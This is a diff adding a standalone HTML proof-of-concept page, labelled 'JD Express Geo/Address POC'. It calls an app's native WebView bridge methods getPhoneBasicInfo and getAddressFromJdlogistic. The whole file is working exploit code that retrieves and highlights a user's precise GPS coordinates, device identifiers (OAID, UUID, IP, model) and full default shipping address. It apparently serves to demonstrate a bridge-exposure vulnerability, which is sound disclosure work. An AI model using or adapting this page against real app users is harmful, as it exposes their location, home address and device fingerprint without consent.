@@ -1,0 +1,40 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>geo_poc</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body{font-family:monospace;background:#111;color:#0f0;margin:0;padding:14px;font-size:13px;word-break:break-all}
+h4{color:#fff;margin:4px 0 10px}
+.item{background:#1b1b1b;border:1px solid #333;border-radius:8px;padding:10px;margin-bottom:10px}
+.item b{color:#ffd60a}
+.st{color:#888}
+pre{margin:6px 0 0;white-space:pre-wrap;color:#9fe870}
+</style></head><body>
+<h4>JD Express Geo/Address POC</h4>
+<div class="item" id="t_geo"><b>① getPhoneBasicInfo (Sys)</b> <span class="st" id="s_geo">calling...</span><pre id="o_geo"></pre></div>
+<div class="item" id="t_addr"><b>② getAddressFromJdlogistic (JDSecondExpress)</b> <span class="st" id="s_addr">calling...</span><pre id="o_addr"></pre></div>
+<script>
+function show(slot, d){
+  document.getElementById('s_'+slot).textContent = ' ← received';
+  var pretty;
+  try {
+    var j = (typeof d==='string') ? JSON.parse(d) : d;
+    pretty = JSON.stringify(j, null, 1);
+    var dd = j.data || j;
+    var keys = ['lng','lat','oaid','uuid','ip','model'];
+    var hl = [];
+    keys.forEach(function(k){ if(dd[k]!==undefined) hl.push(k+'='+dd[k]); });
+    ['provinceName','cityName','countyName','townName','addressDetail','fullAddress','longitude','latitude'].forEach(function(k){
+      if(j[k]!==undefined || (dd && dd[k]!==undefined)) hl.push(k+'='+ (j[k]!==undefined?j[k]:dd[k]));
+    });
+    if (hl.length) pretty = '★ ' + hl.join('  ') + '\n\n' + pretty;
+  } catch(e){ pretty = String(d); }
+  document.getElementById('o_'+slot).textContent = pretty;
+}
+function call(channel, method, cbName, slot){
+  window[cbName] = function(d){ show(slot, d); };
+  window[channel].postMessage(JSON.stringify({method:method, params:null, callBackName:cbName, callBackId:null}));
+}
+// 1) 精确 GPS + 设备指纹）
+call('Sys', 'getPhoneBasicInfo', 'cb_geo', 'geo');
+// 2) 真实默认收寄地址
+setTimeout(function(){ call('JDSecondExpress', 'getAddressFromJdlogistic', 'cb_addr', 'addr'); }, 600);
+</script></body></html>
